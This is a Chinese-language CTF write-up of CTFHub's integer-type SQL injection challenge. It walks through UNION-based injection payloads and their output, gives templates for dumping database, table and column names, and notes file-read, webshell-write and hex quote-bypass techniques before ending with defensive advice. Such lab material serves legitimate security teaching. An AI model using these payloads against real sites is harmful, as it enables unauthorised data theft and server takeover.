---
layout: post
title: CTFHub - SQL 整数型注入 Writeup
platform: ctfhub
date: 2026-10-19 15:32:00 +0800
categories: CTF
---

CTFHub - SQL 整数型注入 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **SQL 注入** → 整数型注入）
- 题型：Web
- 考点：**UNION 联合查询注入**、`information_schema` 元数据表


```text
题目提示（首页原文）：
    输入1          ← 提示你在 URL 里传 id=1
    并且页面会把拼好的 SQL 语句回显出来，例如：
        select * from news where id=1
```

```text
页面标题：CTFHub 技能学习 | 整数型注入
表单：GET 请求，参数名 id，占位提示"输个1试试？"

id=1 的响应：
    <code>select * from news where id=1</code>
    </br>ID: 1</br>Data: ctfhub

★ 输出格式：ID: {第1列}  Data: {第2列}   ← 说明原查询是 2 个字段

探测过程：

① 判断字段数
    ?id=1 order by 1  → ID: 1  Data: ctfhub
    ?id=1 order by 2  → ID: 1  Data: ctfhub
    ?id=1 order by 3  → ★ 空白（越界）
    → 字段数 = 2

② 确认回显位
    ?id=0 union select 1,2  → ID: 1   Data: 2      ← 两列都回显

③ 爆基础信息
    ?id=0 union select 1,database()   → Data: sqli
    ?id=0 union select 1,user()       → Data: root@localhost
    ?id=0 union select 1,version()    → Data: 10.3.22-MariaDB-0+deb10u1
    ?id=0 union select 1,@@version_compile_os → Data: debian-linux-gnu
    ?id=0 union select 1,@@datadir    → Data: /var/lib/mysql/

④ 爆表名
    ?id=0 union select 1,group_concat(table_name)
          from information_schema.tables where table_schema=database()
    → Data: flag,news

⑤ 爆字段名
    ?id=0 union select 1,group_concat(column_name)
          from information_schema.columns where table_name='flag'
    → Data: flag
    （顺便：news 表的字段是 id,data）

⑥ 爆 flag
    ?id=0 union select 1,group_concat(flag) from flag
    → Data: ctfhub{ddf7124bdb43f01ab52466b3}

flag         : ctfhub{ddf7124bdb43f01ab52466b3}
```

> 💡 **两个实战细节**（这题踩到的坑）：
> 1. **必须用 `id=0`**（不存在的 id）而不是 `id=1`。用 id=1 的话前半句已经查到数据，
>    UNION 的结果会被挤到后面，页面只显示原数据。
> 2. **`0` 和 `union` 之间必须有空格**。脚本里拼成 `id=0union select...` 会直接语法报错。
>    浏览器里输入时 URL 里的空格要写成 `%20` 或 `+`。

二、题目分析

**① 什么是 SQL 注入**

```text
后端代码通常是这么写的（PHP）：

    $id = $_GET['id'];                          // ← 直接取用户输入，没有任何过滤
    $sql = "select * from news where id=$id";   // ← 拼进 SQL 语句
    $result = mysql_query($sql);

★ 正常请求：?id=1
      → select * from news where id=1          （只查 id=1 的记录）

★ 恶意请求：?id=1 union select 1,database()
      → select * from news where id=1 union select 1,database()
                                          └──────┬──────┘
                                    攻击者塞进去的语句也被执行了！

这就是 SQL 注入：用户输入变成了 SQL 代码的一部分。
```

**② 整数型 vs 字符型（本题是整数型）**

```text
整数型：SQL 里 id 是数字，没有引号包着
    select * from news where id=1
    → 注入时直接接在后面：id=1 union select ...

字符型：SQL 里 id 被单引号包着
    select * from news where id='1'
    → 注入时要先闭合引号：id=1' union select ... --+
                                     └┬┘        └──┬──┘
                                  闭合引号      注释掉后面多余的引号

★ 本题是整数型 → 不需要闭合引号，直接拼接即可。
```

**③ UNION 注入的原理**

```text
UNION = 把两个查询的结果合并成一个结果集

    select * from news where id=1
    UNION
    select 1,2                      ← 我们自己造的查询

前提条件（三个）：
    ① 前后两个 select 的【字段数必须相同】
    ② 字段类型要能兼容
    ③ 前面那个查询最好查不到东西（用 id=0 或 -1），
       这样页面只显示我们注入的结果

★ 所以要做的第一件事：判断原查询有几个字段。
```

**④ 判断字段数的两种方法**

```text
方法 A：ORDER BY n
    select * from news where id=1 order by 1   → 正常
    select * from news where id=1 order by 2   → 正常
    select * from news where id=1 order by 3   → ★ 报错！
    → 说明只有 2 个字段（order by 3 表示"按第 3 列排序"，第 3 列不存在）

方法 B：UNION SELECT 1,2,3... 逐个试
    select * from news where id=0 union select 1        → 报错（字段数不匹配）
    select * from news where id=0 union select 1,2      → ★ 成功 → 2 个字段
```

**⑤ 信息收集的"藏宝图"：`information_schema`**

```text
MySQL 5.0+ 自带一个系统库 information_schema，
里面记录着【所有数据库/表/字段的名字】—— 注入者的藏宝图。

关键三张表：
    information_schema.schemata    → 所有数据库名（schema_name）
    information_schema.tables      → 所有表名（table_name + table_schema）
    information_schema.columns     → 所有字段名（column_name + table_name）

所以爆库/爆表/爆字段就是查这三张表。
```

三、解题步骤

**第 1 步：确认注入点**

```
浏览器访问：http://challenge-xxx:10800/?id=1
→ 页面回显：select * from news where id=1
→ 说明参数直接拼进 SQL，存在注入

再试 id=1 2 3 往后推：
    id=1 → 有内容
    id=2 → 有内容
    id=3 → ★ 无回显（说明表里只有 2 条数据）
```

> 💡 **为什么要试 id=3**：注入时要用 `id=0` 或一个不存在的 id，
> 让前半句查不到东西，页面才会只显示 UNION 后半句的结果。

**第 2 步：爆库名**

```
?id=3 union select 1,database()
```

**为什么是 `1,database()` 两个值**：
```
原查询 select * from news where id=3 → news 表有 2 个字段
→ UNION 后面也必须给 2 个值
→ 第 1 个填数字 1（占位），第 2 个填 database()（要查的东西）
```

**结果**：`sqli`

**第 3 步：爆表名**

```sql
?id=3 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

**为什么要 `group_concat`**：
```
页面一次只能显示一个字段的值，
而一个库里有多个表 → 用 group_concat 把多个表名拼成一个字符串
    flag,news
```

**结果**：`flag,news` ← ★ 有个 flag 表，这就是目标

**第 4 步：爆字段名**

```sql
?id=3 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'
```

**结果**：`flag`（也可能有 id 等字段）

**第 5 步：爆 flag 数据**

```sql
?id=3 union select 1,group_concat(flag) from sqli.flag
```

**结果**：

```
ctfhub{...}
```

**第 6 步：提交 flag**

---

**用工具一键完成（我写的脚本）**

```text
双击 sqli-union.bat
→ 粘贴带 id 参数的完整地址：http://challenge-xxx:10800/?id=1
→ 问"是否字符型"时，本题回答 N（整数型）
→ 自动跑完 7 个阶段
```

**工具实测输出**（我在本地搭了个模拟靶场验证）：

```text
① 建立基线（id=1）
   URL: http://127.0.0.1:8910/?id=1
   内容: SQL: SELECT * FROM news WHERE id = 1  id:1 title:admin content:...

② 判断字段数
   ORDER BY 1  -> 状态 200  长度 89
   ORDER BY 2  -> 状态 200  长度 89
   ORDER BY 3  -> 状态 200  长度 95   ← ★ 报错
   ★ 字段数 = 2

③ 找数据回显位
   UNION SELECT 1,2    → 页面显示 "id:1 title:2"
   标记法确认的回显位: [1, 2]
   ★ 用第 1 列作输出通道

④ 爆基础信息
   库名      : sqli
   当前用户  : root@localhost
   版本      : 5.7.31
   数据库路径: /var/lib/mysql/

⑤ 爆表名
   table_schema=database() → flag,news

⑥ 爆字段名
   表 flag 的字段: id,flag

⑦ 爆 flag 数据
   FROM flag → ★★★ FLAG: ctfhub{demo_sqli_union_flag}
```

四、延伸知识

**① 常用 SQL 注入函数（背下来）**

| 函数 | 作用 | 例子 |
|---|---|---|
| `database()` | 当前数据库名 | `sqli` |
| `user()` | 当前数据库用户 | `root@localhost` |
| `version()` | MySQL 版本 | `5.7.31` |
| `@@datadir` | 数据库文件路径 | `/var/lib/mysql/` |
| `@@version_compile_os` | 操作系统 | `Linux` |
| `group_concat(x)` | 把多行拼成一个字符串 | `flag,news` |
| `concat(a,b)` | 拼接字符串 | `concat(user,0x3a,pass)` |
| `load_file('/etc/passwd')` | 读服务器文件（需权限）| — |
| `into outfile '/var/www/shell.php'` | 写文件 getshell | — |

**② 爆数据的完整 SQL 模板（直接背）**

```sql
-- 库名
union select 1,database()

-- 所有库
union select 1,group_concat(schema_name) from information_schema.schemata

-- 指定库的所有表
union select 1,group_concat(table_name) from information_schema.tables
  where table_schema=database()

-- 指定表的所有字段
union select 1,group_concat(column_name) from information_schema.columns
  where table_name='flag'

-- 所有库/表/字段一次拿全（information_schema 大礼包）
union select 1,group_concat(table_schema,0x3a,table_name,0x3a,column_name)
  from information_schema.columns
```

> 💡 `0x3a` 是冒号 `:` 的十六进制写法 —— 因为引号有时被过滤，用十六进制能绕过。

**③ UNION 注入的常见坑**

```text
坑 1：字段数不对 → 报错 "The used SELECT statements have a different number of columns"
     解决：先用 ORDER BY 探出字段数

坑 2：回显位是数字但页面不显示
     解决：把数字换成 'MARK' 这样的字符串标记，确认哪一列真的回显

坑 3：前面查到了数据，UNION 的结果被挤到后面看不见
     解决：用 id=0 或 id=-1 让前半句查空

坑 4：引号被过滤 / 被转义
     解决：改用十六进制、CHAR()、或者换字符型注入的闭合方式

坑 5：注释符
     MySQL：#  或 -- （-- 后面必须跟空格）
     其它库：/* */、Oracle 用 --
```

**④ SQL 注入的分类（这是 CTF 里最常见的一类题）**

```text
按回显方式分：
    · UNION 注入   ← 本题：页面有回显，直接用 union 拿数据
    · 报错注入     —— 页面不回显，但会显示 SQL 报错，用 extractvalue/updatexml 报错带出数据
    · 布尔盲注     —— 页面只有"有/没有"两种状态，靠 and 1=1 / and 1=2 逐字符猜
    · 时间盲注     —— 页面连状态都没变，靠 sleep() 的响应时间差猜
    · 堆叠注入     —— 用 ; 执行多条语句（PHP+mysqli 才支持）

按注入位置分：
    · GET / POST 参数
    · Cookie
    · User-Agent / Referer 头
    · 二次注入（先存库，后续查询时触发）
```

**⑤ 防护**

```text
· ★ 参数化查询（预编译语句）—— 最有效
      $stmt = $pdo->prepare("select * from news where id=?");
      $stmt->execute([$id]);
      → 用户输入永远是"数据"，不会变成"代码"

· 输入校验：id 必须是数字 → intval() / (int) 强制转换
· 最小权限：数据库账号不要用 root，只给必要权限
· 关闭错误回显：不要让用户看到 SQL 报错（display_errors=Off）
· WAF / 关键字过滤（辅助手段，可被绕过，不能代替参数化查询）
```

五、总结

- **本题核心：整数型注入 → UNION 联合查询 → 从 `information_schema` 爆出库/表/字段 → 拿 flag。**
- 五步固定套路：

```text
① ORDER BY n            → 判断字段数（报错的那个 n-1）
② id=0 union select 1,2 → 找回显位
③ database()            → 爆库名
④ information_schema    → 爆表名、字段名
⑤ group_concat(flag)    → 爆数据
```

- **关键记忆点**：

```text
★ UNION 前后字段数必须相同
★ 用 id=0 / id=-1 让前半句查空，独占回显位
★ group_concat() 把多行合并成一个字符串（页面上一次只能显示一行）
★ information_schema 是 MySQL 的"元数据地图"
```
